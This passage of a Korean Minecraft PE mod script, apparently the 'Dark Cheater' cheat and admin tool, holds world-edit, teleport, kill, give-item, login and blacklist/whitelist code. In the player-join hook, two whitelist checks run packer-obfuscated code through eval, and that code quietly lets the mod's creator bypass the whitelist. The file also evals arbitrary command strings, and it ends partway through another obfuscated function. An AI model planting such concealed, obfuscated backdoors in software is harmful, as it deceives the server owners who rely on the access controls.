for(var m=-Data[1];m<Number(Data[1])+1;m++){
for(var o=-Data[1];o<Number(Data[1])+1;o++){
var sph = Math.pow(n, 2)+Math.pow(m, 2)+Math.pow(o, 2);
if(sph>=Math.pow(Number(Data[1])-1, 2)&&sph<=Math.pow(Data[1], 2))
setTile(w.x[0]+n, w.y[0]+m, w.z[0]+o, Data[2], Data[3], w.back);
}}}
if(w.uin){
Dark.toast(Item.getName(Data[2], Data[3])+"(으)로 내부가 구를 생성했습니다.");
}
else{
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 구를 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 구를 생성했습니다.");
}
}
if(Data[0]=="sphereh"){
if(w.back) w.backUpData = [];
for(var n=-Data[1];n<Number(Data[1])+1;n++){
for(var m=0;m<Number(Data[1])+1;m++){
for(var o=-Data[1];o<Number(Data[1])+1;o++){
var sph = Math.pow(n, 2)+Math.pow(m, 2)+Math.pow(o, 2);
if(sph>=Math.pow(Number(Data[1])-1, 2)&&sph<=Math.pow(Data[1], 2))
setTile(w.x[0]+n, w.y[0]+m, w.z[0]+o, Data[2], Data[3], w.back);
}}}
if(w.uin){
Dark.toast(Item.getName(Data[2], Data[3])+"(으)로 내부가 반구를 생성했습니다.");
}
else{
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 반구를 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 반구를 생성했습니다.");
}
}
if(Data[0]=="sphere2"){
if(w.back) w.backUpData = [];
for(var n=-Data[1];n<Number(Data[1])+1;n++){
for(var m=-Data[1];m<Number(Data[1])+1;m++){
for(var o=-Data[1];o<Number(Data[1])+1;o++){
if(Math.pow(n, 2)+Math.pow(m, 2)+Math.pow(o, 2)<=Math.pow(Data[1], 2))
setTile(w.x[0]+n, w.y[0]+m, w.z[0]+o, Data[2], Data[3], w.back);
}}}
if(w.uin){
Dark.toast(Item.getName(Data[2], Data[3])+"(으)로 내부가 차있는 구를 생성했습니다.");
}
else{
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 내부가 차있는 구를 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 내부가 차있는 구를 생성했습니다.");
}
}
if(Data[0]=="line"){
if(w.back) w.backUpData = [];
px = Entity.getX(ad);
py = Entity.getY(ad);
pz = Entity.getZ(ad);
yaw = Math.floor(Entity.getYaw(ad));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=1;gun<Number(Data[1])+1;gun++)
setTile(px+gun*sin, py, pz+gun*cos, Data[2], Data[3], w.back);
if(w.uin){
Dark.toast(Item.getName(Data[1], Data[2])+"(으)로 직선을 생성했습니다.");
}
else{
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 직선을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 직선을 생성했습니다.");
}
}
if(Data[0]=="line2"){
if(w.back) w.backUpData = [];
px = Entity.getX(ad);
py = Entity.getY(ad);
pz = Entity.getZ(ad);
yaw = Math.floor(Entity.getYaw(ad));
pitch = Math.floor(Entity.getPitch(ad));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
tan = -Math.sin(pitch/180*Math.PI);
pcos = Math.cos(pitch/180*Math.PI);
for(var gun=1;gun<Number(Data[1])+1;gun++)
setTile(px+gun*sin*pcos, py+gun*tan, pz+gun*cos*pcos, Data[2], Data[3], w.back);
if(w.uin){
Dark.toast(Item.getName(Data[1], Data[2])+"(으)로 직선을 생성했습니다.");
}
else{
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 직선을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 직선을 생성했습니다.");
}
}
if(Data[0]=="unreplace"){
fixPosData();
if(w.back) w.backUpData = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if(getTile(xx, yy, zz)!=Data[1])
setTile(xx, yy, zz, Data[2], 0, w.back);
if(w.uin) Dark.toast(Item.getName(Data[1], 0)+"(을)를 제외한 블록들을 "+Item.getName(Data[1], 0)+"(으)로 바꾸었습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+"인 블록들을 제외한 블록들이 "+Data[2]+"인 블록으로 변경되었습니다.");
}
if(Data[0]=="unchange"){
fixPosData();
if(w.back) w.backUpData = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if(!(getTile(xx, yy, zz)==Data[1]&&Level.getData(xx, yy, zz)==Data[2]))
setTile(xx, yy, zz, Data[3], Data[4], w.back);
if(w.uin) Dark.toast(Item.getName(Data[1], Data[2])+"(을)를 제외한 블록들을 "+Item.getName(Data[3], Data[4])+"(으)로 바꾸었습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+", 블록 데미지가 "+Data[2]+"인 블록들을 제외한 블록들이, 블록 아이디가 "+Data[3]+", 블록 데미지가 "+Data[4]+"인 블록으로 변경되었습니다.");
}

}


if(cmd=="dawn"){
Level.setTime(0);
darkMessage("Time set to Dawn.");
}
if(cmd=="day"){
Level.setTime(1000);
darkMessage("Time set to Day.");
}
if(cmd=="dusk"){
if(mcpev2) Level.setTime(12000);
else Level.setTime(9600);
darkMessage("Time set to Dusk.");
}
if(cmd=="night"){
Level.setTime(14000);
darkMessage("Time set to Night.");
}
if(Data[0]=="burst"){
if(Data[1]!=null){
darkType = 1;
darkTypeE = Data[1];
darkMessage("Burst Mode on");
}
else if(Data[1]==null){
darkMessage("You should imput burst radius");
}
}
if(cmd=="remove"){
darkType = 2;
darkMessage("Remove Mode on");
}
if(cmd=="mine"){
darkType = 3;
darkMessage("Mine Mode on");
}
if(cmd=="ride"){
darkType = 4;
darkMessage("Ride Mode on");
}
if(Data[0]=="tp"&&Data[3]!=null){
Entity.setPosition(ad, Data[1], Data[2], Data[3]);
darkMessage("Teleported to "+Data[1]+", "+Data[2]+", "+Data[3]+".");
}
if(cmd=="kill"){
darkType = 5;
darkMessage("Kill Mode on");
}
if(cmd=="off"){
darkType = 0;
darkMessage("Darkness off");
}
if(Data[0]=="add"&&Data[1]!=null){
if(Data[3]!=null){
addItemInventory(Data[1], Data[2], Data[3]);
darkMessage(Item.getName(Data[1], Data[3])+"("+Data[1]+", "+Data[2]+", "+Data[3]+") was given.");
}
else if(Data[3]==null){
if(Data[2]==null){
addItemInventory(Data[1], 1, 0);
darkMessage(Item.getName(Data[1], 0)+"("+Data[1]+", 1, 0) was given.");
}
else{
addItemInventory(Data[1], Data[2], 0);
darkMessage(Item.getName(Data[1], 0)+"("+Data[1]+", "+Data[2]+", 0) was given.");
}
}
}
if(cmd=="survival"||cmd=="gm 0"){
Level.setGameMode(0);
darkMessage("Gamo Mode 0 (Survival)");
}
if(cmd=="creative"||cmd=="gm 1"){
Level.setGameMode(1);
darkMessage("Gamo Mode 1 (Creative)");
}
if(Data[0]=="give"){
var pp = findHuman(Data2[1]);
Level.dropItem(Entity.getX(pp), Entity.getY(pp), Entity.getZ(pp), 0, Data[1], Data[2], Data[3]);
darkMessage("Items were given to "+Data2[1]+".");
}
if(Data2[0]=="go"){
var pp = findHuman(Data2[1]);
Entity.setPosition(Player.getEntity(), Entity.getX(pp), Entity.getY(pp)+1, Entity.getZ(pp));
darkMessage("Teleported to "+Data2[1]+".");
}
if(Data[0]=="health"){
Entity.setHealth(ad, Data[1]);
darkMessage("Set Health to "+Data[1]+".");
}
if(Data[0]=="time"){
Level.setTime(Data[1]);
darkMessage("Time Set to "+Data[1]+".");
}
if(Data2[0]=="kill"){
var pp = findHuman(Data2[1]);
Entity.setHealth(pp, 0);
darkMessage(Data2[1]+" was killed.");
}
if(Data2[0]=="call"){
var pp = findHuman(Data2[1]);
teleport(pp, Entity.getX(ad), Entity.getY(ad)+1, Entity.getZ(ad));
darkMessage(Data2[1]+" was called.");
}

if(cmd=="hero k"){
h.l = true;
Dark.toast("언어설정(히로빈) - 한국어");
}
if(cmd=="hero e"){
h.l = false;
Dark.toast("Language set(Herobrine) - English");
}
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] 명령어 사용 (/"+cmd+")\n";
if(cmd=="dc btn size"){
Dark.selectButtonSize();
}
if(cmd=="set home"){
homePos = [Player.getX(), Player.getY(), Player.getZ()];
darkMessage("Home was set.");
}
if(cmd=="home"){
Entity.setPosition(Player.getEntity(), homePos[0], homePos[1]+1, homePos[2]);
darkMessage("Moved to Home.");
}
if(Data[0]=="dc"&&Data[1]=="login"){
if(Dark.checkPermission("login")){
darkMessage("서버로부터 데이터를 받아오고 있습니다...");
Dark.login(Data[2], Data[3]);
}
else{
darkMessage("제작자 측에서 로그인을 차단하였습니다.");
}
}


}


function darkProcCmd(cmd){
try{
eval(cmd);
}
catch(e){
Dark.showDialog("오류 발생", e.toString());
}

}


function procCmdOp(op, cmd){
var Data = cmd.split(" ");
var Data2 = cmd.split("  ");
var opu = findHuman(op);
var nn = ops.indexOf(opu);
if(cmd==".day"&&opData[nn][0]){
Level.setTime(500);
Dark.toast(op+"(이)가 명령어 .day를 사용하였습니다.");
}
if(cmd==".night"&&opData[nn][1]){
Level.setTime(14000);
Dark.toast(op+"(이)가 명령어 .night를 사용하였습니다.");
}
if(Data[0]==".tp"&&Data[3]!=null&&opData[nn][2]){
teleport(opu, Data[1], Data[2], Data[3]);
Dark.toast(op+"(이)가 명령어 .tp를 사용하였습니다.\n("+Data[1]+", "+Data[2]+", "+Data[3]+")로 이동함.");
}
if(Data[0]==".add"&&opData[nn][3]){
if(Data[1]!=null){
if(Data[3]!=null){
Level.dropItem(Entity.getX(opu), Entity.getY(opu), Entity.getZ(opu), 0, Data[1], Data[2], Data[3]);
Dark.toast(op+"(이)가 명령어 .add를 사용하였습니다.\n(아이디 "+Data[1]+", 데미지 "+Data[3]+", 개수 "+Data[2]+")");
}
if(Data[3]==null){
if(Data[2]==null){
Dark.toast(op+"(이)가 명령어 .add를 사용하였습니다.\n(아이디 "+Data[1]+", 데미지 0, 개수 1)");
Level.dropItem(Entity.getX(opu), Entity.getY(opu), Entity.getZ(opu), 0, Data[1], 1, 0);
}
else{
Level.dropItem(Entity.getX(opu), Entity.getY(opu), Entity.getZ(opu), 0, Data[1], Data[2], 0)
Dark.toast(op+"(이)가 명령어 .add를 사용하였습니다.\n(아이디 "+Data[1]+", 데미지 0, 개수 "+Data[2]+")");
}
}
}
}
if(Data[0]==".give"&&opData[nn][4]){
var pp = findHuman(Data2[1]);
Level.dropItem(Entity.getX(pp), Entity.getY(pp), Entity.getZ(pp), 0, Data[1], Data[2], Data[3]);
Dark.toast(op+"(이)가 명령어 .give를 사용하였습니다.\n(아이디 "+Data[1]+", 데미지 "+Data[1]+", 개수 "+Data[2]+", 수신자 : "+Data2[1]+")");
}
if(Data2[0]==".go"&&opData[nn][5]){
var pp = findHuman(Data2[1]);
teleport(Player.getEntity(), Entity.getX(pp), Entity.getY(pp)+1, Entity.getZ(pp));
Dark.toast(op+"(이)가 명령어 .go를 사용하였습니다.\n(타겟 : "+Data2[1]+")");
}
if(Data[0]==".health"&&opData[nn][6]){
Entity.setHealth(opu, Data[1]);
Dark.toast(op+"(이)가 명령어 .health를 사용하였습니다.\n(체력 : "+Data[1]+")");
}
if(Data2[0]==".kill"&&opData[nn][7]){
var pp = findHuman(Data2[1]);
if(ad!=pp){
Entity.setHealth(pp, 0);
Dark.toast(op+"(이)가 명령어 .kill를 사용하였습니다.\n(타겟 : "+Data2[1]+")");
}
else{
Dark.toast(op+"(이)가 명령어 .kill로 서버장 사살을 시도하였습니다.");
}
}
if(Data2[0]==".call"&&opData[nn][8]){
var pp = findHuman(Data2[1]);
teleport(pp, Entity.getX(opu), Entity.getY(opu)+1, Entity.getZ(opu));
Dark.toast(op+"(이)가 명령어 .call를 사용하였습니다.\n(타겟 : "+Data2[1]+")");
}
if(Data[0]==".heal"&&opData[nn][9]){
var pp = findHuman(Data2[1]);
Entity.setHealth(opu, 20);
Dark.toast(op+"(이)가 명령어 .heal를 사용하였습니다.\n(타겟 : "+Data[1]+")");
}
if(Data2[0]==".kick"&&opData[nn][10]){
var pp = findHuman(Data2[1]);
if(ad!=pp){
Entity.remove(pp);
Dark.toast(op+"(이)가 명령어 .kick를 사용하였습니다.\n(타겟 : "+Data2[1]+")");
}
else{
Dark.toast(op+"(이)가 명령어 .kick으로 서버장 추방을 시도하였습니다.");
}
}


}


function procCmdWE(user, cmd){
var Data = cmd.split(" ");
var x1, y1, z1, x2, y2, z2, n;
for(var m=0;m<wo.user.length;m++){
if(wo.user==user){
n = m;
break;
}
}
x1 = Math.min(wo.x1[n], wo.x2[n]);
y1 = Math.min(wo.y1[n], wo.y2[n]);
z1 = Math.min(wo.z1[n], wo.z2[n]);
x2 = Math.max(wo.x1[n], wo.x2[n]);
y2 = Math.max(wo.y1[n], wo.y2[n]);
z2 = Math.max(wo.z1[n], wo.z2[n]);
if(Data[0]==".set"){
setTiles(x1, x2, y1, y2, z1, z2, Data[1], Data[2]);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".replace"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if(getTile(xx, yy, zz)==Data[1])
setTile(xx, yy, zz, Data[2]);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".change"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if(getTile(xx, yy, zz)==Data[1]&&Level.getData(xx, yy, zz)==Data[2])
setTile(xx, yy, zz, Data[3], Data[4]);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(cmd==".no tree"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if((getTile(xx, yy, zz)==17)||(getTile(xx, yy, zz)==18)||(getTile(xx, yy, zz)==161)||(getTile(xx, yy, zz)==162))
setTile(xx, yy, zz, 0);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(cmd==".snow"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if(getTile(xx, yy, zz)!=0&&getTile(xx, yy+1, zz)==0)
setTile(xx, yy+1, zz, 78);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(cmd==".no water"){
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if((getTile(xx, yy, zz)==8)||(getTile(xx, yy, zz)==9))
setTile(xx, yy, zz, 0);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".circle"){
var wsin, wcos;
for(var nn=0;nn<360;nn++){
wsin = Math.sin(nn*Math.PI/36);
wcos = Math.cos(nn*Math.PI/36);
setTile(wo.x1[n]+0.5+Data[1]*wsin, wo.y1[n], wo.z1[n]+0.5+Data[1]*wcos, Data[2], Data[3]);
}
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".cylin"){
var wsin, wcos;
for(var nn=0;nn<Data[2];nn++){
for(var mm=0;mm<360;mm++){
wsin = Math.sin(mm*Math.PI/36);
wcos = Math.cos(mm*Math.PI/36);
setTile(wo.x1[n]+0.5+Data[1]*wsin, wo.y1[n]+nn, wo.z1[n]+0.5+Data[1]*wcos, Data[3], Data[4]);
}
}
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".sphere"){
for(var nn=-Data[1];nn<Number(Data[1])+1;nn++){
for(var m=-Data[1];m<Number(Data[1])+1;m++){
for(var o=-Data[1];o<Number(Data[1])+1;o++){
var sph = Math.pow(nn, 2)+Math.pow(m, 2)+Math.pow(o, 2);
if(sph>=Math.pow(Number(Data[1])-1, 2)&&sph<=Math.pow(Data[1], 2))
setTile(wo.x1[n]+nn, wo.y1[n]+m, wo.z1[n]+o, Data[2], Data[3]);
}}}
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".line"){
var pp = findHuman(user);
px = Entity.getX(pp);
py = Entity.getY(pp);
pz = Entity.getZ(pp);
yaw = Math.floor(Entity.getYaw(pp));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=1;gun<Number(Data[1])+1;gun++)
setTile(px+gun*sin, py, pz+gun*cos, Data[2], Data[3]);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}


}


function fixPosData(){
w.x[2] = Math.min(w.x[0], w.x[1]);
w.y[2] = Math.min(w.y[0], w.y[1]);
w.z[2] = Math.min(w.z[0], w.z[1]);
w.x[3] = Math.max(w.x[0], w.x[1]);
w.y[3] = Math.max(w.y[0], w.y[1]);
w.z[3] = Math.max(w.z[0], w.z[1]);
}


function entityAddedHook(e){
var type = Entity.getEntityTypeId(e);
if(noEnt&&!Player.isPlayer(e)&&antiEnt.indexOf(type)!=-1) Entity.remove(e);
if(anti>0&&type==64) Entity.remove(e);
if(antiTerror[0]&&type==65) Entity.remove(e);
else if(antiTerror[18]&&type==52) Entity.remove(e);
else if(antiTerror[19]&&type==71) Entity.remove(e);
if(Player.isPlayer(e)) playerAddedHook(e);
if(type==0){
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(150);
if(Player.isPlayer(e)) entityAddedHook(e);
}
}).start();
}
if(type==93&&lp>0) explode(Entity.getX(e), Entity.getY(e), Entity.getZ(e), lp, true);
if(Entity.getNameTag(e)=="§0Dark Tornado"&&!Player.isPlayer(e)){
Entity.setRenderType(e, darkRender.renderType);
Entity.setHealth(e, 999);
Entity.setCollisionSize(e, 0.7, 1.8);
try{
Entity.setMaxHealth(e, 999);
}
catch(e){
//null
}
}


}


function playerAddedHook(e){
f.pp.push(e);
f.n.push(0);
if(pls.indexOf(e)==-1){
pls.push(e);
pls2.push(Player.getName(e));
}
if(noPlayer){
darkMessage(Player.getName(e)+"(을)를 내보냅니다.", true);
Entity.remove(e);
}
if(noAdmin&&Player.getName(e)==ModPE.getUserName()){
darkMessage(Player.getName(e)+"(이)가 서버장 사칭을 시도하여 내보냅니다.", true);
Entity.remove(e);
}
if(kickArray[0]!=null){
for(var n in kickArray){
if(kickArray[n][1]==e){
darkMessage("인첸트된 아이템 사용으로 블록런처 종료 시점까지 접속이 차단된 플레이어가 감지되어 자동으로 강퇴합니다.", true);
darkMessage("원래 닉네임 : "+kickArray[n][0]+", 현재 닉네임 : "+Player.getName(e), true);
Entity.remove(e);
}
}
}
var list = blackList.split("\n");
for(var n in list){
if(Player.getName(e)==list[n]){
if(blackListOn){
darkMessage("닉네임 밴 당한 플레이어("+Player.getName(e)+")가 감지되어 자동으로 강퇴합니다.", true);
Entity.remove(e);
}
else{
darkMessage("닉네임 밴 당한 플레이어("+Player.getName(e)+")가 들어왔습니다.");
}
break;
}
}
var list = blackListId.split("\n");
for(var n in list){
var list2 = list[n].toString().split("::");
if(e==list2[1]){
if(blackListIdOn){
darkMessage("맵 접속 방지를 당한 당한 플레이어가 감지되어 자동으로 강퇴합니다.", true);
darkMessage("원래 닉네임 : "+list2[0]+", 현재 닉네임 : "+Player.getName(e), true);
Entity.remove(e);
}
else{
darkMessage("맵 접속 방지를 당한 플레이어("+Player.getName(e)+")가 들어왔습니다.", true);
darkMessage("원래 닉네임 : "+list2[0]+", 현재 닉네임 : "+Player.getName(e));
}
break;
}
}
serverLog += "[서버 접속] 닉네임 : "+Player.getName(e)+", 시간 : "+Dark.getTime()+"\n";
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(e)+"(이)가 서버에 들어옴\n";
if(whiteListOn){
var code = function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('d 7=0;d c=l["\\k\\j\\g\\r\\4"]("\\n");q(d n=0;n<c["\\g\\3\\s\\5\\4\\m"];n++){9(b["\\5\\3\\4\\8\\a\\6\\3"](e)==c[n]){7=1;f}o 9(b["\\5\\3\\4\\8\\a\\6\\3"](e)==p()){7=2;f}}9(7==0){h("허가 받지 않은 플레이어("+b["\\5\\3\\4\\8\\a\\6\\3"](e)+")가 감지되어 자동으로 강퇴합니다.",i);t["\\u\\3\\6\\v\\w\\3"](e)}9(7==2)h("다크 치터 제작자("+b["\\5\\3\\4\\8\\a\\6\\3"](e)+")가 화이트 리스트를 뚫고 들어왔습니다.",i);',33,33,'|||x65|x74|x67|x6D|kick|x4E|if|x61|Player|list|var||break|x6C|darkMessage|true|x70|x73|whiteList|x68||else|darkCheaterEnable|for|x69|x6E|Entity|x72|x6F|x76'.split('|'),0,{});
eval(code);
}
if(useLogin){
var list = Dark.read("login").toString().split("\n");
var ris = false;
for(var n in list){
var data = list[n].split("::");
if(Player.getName(e)==data[0]){
darkMessage("이미 회원가입이 되어있는 닉네임입니다. 명령어 \".로그인 [비밀번호]\"로 로그인을 하시거나, 다른 닉네임을 사용하여 주세요.", true);
notLoginArray.push(e);
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(20000);
if(notLoginArray.indexOf(e)!=-1){
darkMessage("로그인 시간제한 초과로 인해 "+Player.getName(e)+"(을)를 추방합니다.", true);
notLoginArray.splice(n, 1);
java.lang.Thread.sleep(1000);
Entity.remove(e);
}
}
}).start();
ris = true;
break;
}
}
if(!ris){
darkMessage("회원가입이 되어있지 않은 닉네임입니다. 명령어 \".가입 [비밀번호]\"로 회원가입을 해주세요.", true);
notRigisterArray.push(e);
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(20000);
if(notRigisterArray.indexOf(e)!=-1){
darkMessage("회원가입 시간제한 초과로 인해 "+Player.getName(e)+"(을)를 추방합니다.", true);
notRigisterArray.splice(n, 1);
java.lang.Thread.sleep(1000);
Entity.remove(e);
}
}
}).start();
}
posData.push([e, Entity.getX(e), Entity.getY(e), Entity.getZ(e)]);
}
if(ciwl.tf){
var code = function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2 5=c.h.b("\\n");2 6=3;i(2 n d 5){2 a=5[n].b("::");9(e==a[1]){7(a[0]+"(은)는 접속이 허가된 플레이어입니다.",3);6=f;g}}9(6){9(4.8(e)==j){7("제작자("+4.8(e)+")가 k.l.m.o.을 뚫고 들어왔습니다.",3)}p{7("접속이 허가되지 않은 플레이어("+4.8(e)+")가 접속하여, 자동으로 강퇴시킵니다.",3);q.r(e)}}',28,28,'||var|true|Player|list|kick|darkMessage|getName|if|list2|split|ciwl|in||false|break|data|for|mnmn|C|I|W||L|else|Entity|remove'.split('|'),0,{});
eval(code)
}


}


function explodeHook(e, x, y, z, p, f){
if(adTer||(!adTer&&ad!=e)){
if(antiTerror[1]){
preventDefault();
if(terrorAlert){
var type = Entity.getEntityTypeId(e);
if(type==0)
Dark.toast("TNT의 폭발을 지웠습니다.");
if(type==33)
Dark.toast("크리퍼의 폭발을 지웠습니다.");
if(type==63)
Dark.toast("explode 함수의 폭발을 지웠습니다.");
}
}
}

if(exp.onoff){
if(Player.isPlayer(e)&&Level.getGameMode()==0){
var dis = getDistanceFromAdmin(x, y, z);
if(dis<=(p+1)&&exp.c==0){
if(dis>0.5){
Entity.setHealth(ad, Entity.getHealth(ad)-Math.round(3*p/dis));
}
else if(p<3){
Entity.setHealth(ad, Entity.getHealth(ad)-Math.round((5*p-1)/(dis+1)));
}
else{
Entity.setHealth(ad, Entity.getHealth(ad)-Math.round((5*p+4)/(dis+1)+2));
}
if(Math.abs(exp.x-x)<1.5&&Math.abs(exp.y-y)<1.5&&Math.abs(exp.z-z)<1.5){
exp.c = 1;
}
exp.x = x;
exp.y = y;
exp.z = z;
}
else if(exp.c==1){
exp.c = 2;
}
else if(exp.c==2){
exp.c = 0;
}
}
}
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] 위치 ("+x+", "+y+", "+z+")에서 "+p+" 규모의 폭발 발생\n";
if(getPlayers) playerAddedHandler(Player.getEntity());


}


function deathHook(m, v){
if(hyperLogOn){
var isPlayer = Player.isPlayer(m);
var typeId = Entity.getEntityTypeId(v);
if(isPlayer&&typeId==63) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(m)+"(이)가 "+Player.getName(v)+"(을)를 죽임\n";
else if(isPlayer&&typeId!=63) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(m)+"(이)가 "+typeId+"번 엔티티를 죽임\n";
else if(!isPlayer&&typeId==63) hyperLog += "["+Dark.getTime(2)+"] "+Entity.getEntityTypeId(m)+"번 엔티티가 "+Player.getName(v)+"(을)를 죽임\n";
else if(!isPlayer&&typeId!=63) hyperLog += "["+Dark.getTime(2)+"] "+typeId+"번 엔티티 사망\n";
}
if(invenSave&&ad==v&&!Dark.isMulti()){
anti = 15;
}
if(deathAntiLack&&Player.isPlayer(v)) anti = 15;
if(getPlayers){
playerAddedHandler(m);
playerAddedHandler(v);
}
if(compileFinish){
var murderer = m, victim = v;
eval(dcmsData.deathHook+"");
}
eval(astel.dh+"");


}


function darkCheaterEnable(tf){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('J{1g 